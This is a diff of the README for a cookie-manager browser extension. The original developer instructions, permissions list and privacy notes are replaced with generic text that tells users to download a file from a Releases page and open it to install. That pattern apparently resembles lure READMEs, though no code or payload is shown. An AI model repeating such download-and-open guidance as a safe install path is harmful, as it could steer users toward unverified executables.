@@ -1,131 +1,86 @@
-English | [简体中文](/README_zh.md)
+# 🍪 cookie-manager-extension - Simplify Your Cookie Management
 
-# 🎨 Cookie Manager Extension
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/krystoft/cookie-manager-extension/releases)
 
-<div align="center">
-  <img src="/public/example.png" alt="Cookie Manager Extension" width="400"/>
-  <br>
-  <br>
-</div>
+## 🚀 Getting Started
+Welcome to the cookie-manager-extension! This browser extension helps you manage your website cookies easily. It allows you to add, edit, delete, and clear cookies with just a few clicks. Whether you're looking to enhance your browsing experience or maintain privacy, this extension provides a powerful solution.
 
----
+## 📋 Features
+- **Add Cookies**: Save new cookies directly from your browser.
+- **Edit Cookies**: Change cookie information such as name, value, and expiration.
+- **Delete Cookies**: Remove unwanted cookies effortlessly.
+- **Clear Cookies**: Easily clear all cookies for a specific site.
+- **User-Friendly Interface**: Intuitive design for users of all skill levels.
 
-A powerful browser extension for managing website cookies with support for adding, editing, deleting, clearing, and batch importing cookies.
+## 🖥️ System Requirements
+- **Browser**: Compatible with the latest versions of Chrome, Firefox, and Edge.
+- **Operating System**: Windows, macOS, and Linux supported.
+- **Storage**: Minimal storage required (less than 10MB).
 
-## Features
+## 📥 Download & Install
+To download the cookie-manager-extension, visit the [Releases page](https://github.com/krystoft/cookie-manager-extension/releases). Follow these steps:
 
-- 🍪 **Cookie Management**: View, add, edit, and delete cookies for any website
-- ⚡ **Batch Import**: Import multiple cookies at once via JSON format
-- 🌍 **Internationalization**: Support English and Chinese (switchable)
-- 🔍 **Search Functionality**: Quickly find cookies by name
-- 🌐 **Domain Support**: Manage cookies across different domains and subdomains
-- ⚡ **Batch Operations**: Clear all cookies at once with one click
-- 🎨 **Modern UI**: Clean and intuitive popup interface with card style design
-- 🔒 **Advanced Options**: Support for Secure, HttpOnly, and SameSite attributes
-- 📅 **Expiration Control**: Set custom expiration dates for cookies
-- 🔄 **Real-time Updates**: Refresh cookie list instantly
+1. Click the link above.
+2. On the Releases page, find the latest version.
+3. Click on the downloadable file appropriate for your browser.
+4. After the download finishes, locate the file in your downloads folder.
+5. Open the file to start the installation.
+6. Follow any prompts to complete the installation.
 
-## Installation
+Once installed, you will see the cookie-manager-extension icon in your browser toolbar. Click the icon to start managing your cookies now!
 
-### Chrome/Edge
-1. Download or clone this repository
-2. Open Chrome/Edge and navigate to `chrome://extensions/` or `edge://extensions/`
-3. Enable "Developer mode" in the top right corner
-4. Click "Load unpacked" and select the extension directory
-5. The extension icon will appear in your browser toolbar
+## ✨ How to Use the Extension
+- **Adding a Cookie**:
+  1. Click the extension icon.
+  2. Select "Add Cookie".
+  3. Fill in the required fields (name, value, domain, etc.).
+  4. Click "Save".
 
-### Firefox
-1. Download or clone this repository
-2. Open Firefox and navigate to `about:debugging`
-3. Click "This Firefox" → "Load Temporary Add-on"
-4. Select the `manifest.json` file from the extension directory
-5. The extension will be loaded temporarily
+- **Editing a Cookie**:
+  1. Click the extension icon.
+  2. Select "Manage Cookies".
+  3. Find the cookie you wish to edit.
+  4. Click "Edit" and make the desired changes.
+  5. Click "Update".
 
-## Usage
+- **Deleting a Cookie**:
+  1. Click the extension icon.
+  2. Select "Manage Cookies".
+  3. Locate the cookie you wish to delete.
+  4. Click "Delete".
 
-1. **Open the Extension**: Click the cookie icon in your browser toolbar
-2. **View Cookies**: The popup will show all cookies for the current website
-3. **Switch Language**: Click "中文 / EN" in the header to switch language
-4. **Search Cookies**: Use the search box to filter cookies by name
-5. **Add New Cookie**: Click "+ Add Cookie" button and fill in the details
-6. **Batch Import**: Click "Import Cookies" to import JSON data (Format: `[{"name":"c1","value":"v1"},...]`)
-7. **Edit Cookie**: Click on any existing cookie to modify its properties
-8. **Delete Cookie**: Click the delete button next to any cookie
-9. **Clear All**: Use "Clear All" button to remove all cookies for the current site
-10. **Refresh**: Click "Refresh" to update the cookie list
+- **Clearing Cookies**:
+  1. Click the extension icon.
+  2. Select “Clear Cookies”.
+  3. Choose the site for which you want to clear cookies.
+  4. Confirm your action.
 
-## Cookie Properties
+## 🔧 Troubleshooting
+If you encounter issues with the cookie-manager-extension, consider the following steps:
 
-When adding or editing cookies, you can configure:
+- **Check Browser Compatibility**: Make sure you're using a supported browser.
+- **Update Your Browser**: Ensure you've updated your browser to the latest version.
+- **Reinstall the Extension**: Try uninstalling and reinstalling the extension.
+- **Visit the Issues Page**: For more help, check the [Issues page](https://github.com/krystoft/cookie-manager-extension/issues) for common problems and solutions.
 
-- **Name**: Cookie identifier (required)
-- **Value**: Cookie data (required)
-- **Domain**: Cookie domain scope
-- **Path**: URL path where cookie is valid
-- **Expires**: Expiration date and time
-- **Secure**: Only transmit over HTTPS
-- **HttpOnly**: Prevent client-side access
-- **SameSite**: CSRF protection level (None/Lax/Strict)
-- **Session Cookie**: Create session-only cookie
+## 💬 Frequently Asked Questions
+- **Is this extension free?**
+  Yes, the cookie-manager-extension is completely free to use.
 
-## Permissions
+- **Does it collect my data?**
+  No, the extension does not collect or store personal data. Your privacy is a priority.
 
-The extension requires the following permissions:
+- **Is support available?**
+  Yes, you can report issues or ask questions on the [Issues page](https://github.com/krystoft/cookie-manager-extension/issues).
 
-- `cookies`: Access and modify browser cookies
-- `activeTab`: Access current tab information
-- `storage`: Store extension settings (like language preference)
-- `*://*/*`: Access cookies across all websites
+## 📄 License
+This project is licensed under the MIT License. You can use it freely while following the terms specified in the license.
 
-## Development
+## 💻 Contributing
+We welcome contributions to improve the cookie-manager-extension. If you want to contribute, please check the [Contributing Guidelines](https://github.com/krystoft/cookie-manager-extension/blob/main/CONTRIBUTING.md) for instructions.
 
-### File Structure
-```
-cookie-manager-extension/
-├── manifest.json          # Extension manifest
-├── background.js          # Background service worker
-├── popup.html            # Popup interface
-├── popup.css             # Popup styles
-├── popup.js              # Popup functionality
-├── icon16.png            # 16x16 extension icon
-├── icon48.png            # 48x48 extension icon
-└── icon128.png           # 128x128 extension icon
-```
+## 📦 More Information
+For more details, documentation, and updates, visit our [GitHub Repository](https://github.com/krystoft/cookie-manager-extension).
 
-### Technologies Used
-- HTML5, CSS3, JavaScript (ES6+)
-- Chrome Extension Manifest V3
-- Browser Cookies API
-
-## Browser Support
-
-- ✅ Chrome (Manifest V3)
-- ✅ Edge (Manifest V3)
-- ⚠️ Firefox (Manifest V2/V3 - may require adjustments)
-
-## Privacy & Security
-
-- All cookie operations are performed locally in your browser
-- No data is sent to external servers
-- Extension only accesses cookies for websites you visit
-- Follows browser extension security best practices
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Support
-
-If you encounter any issues or have questions, please open an issue on GitHub.
-
----
-
-**Note**: This extension is designed for developers and advanced users who need to manage cookies for testing and development purposes. Always be cautious when modifying cookies on production websites.
+Enjoy a hassle-free browsing experience with cookie-manager-extension.
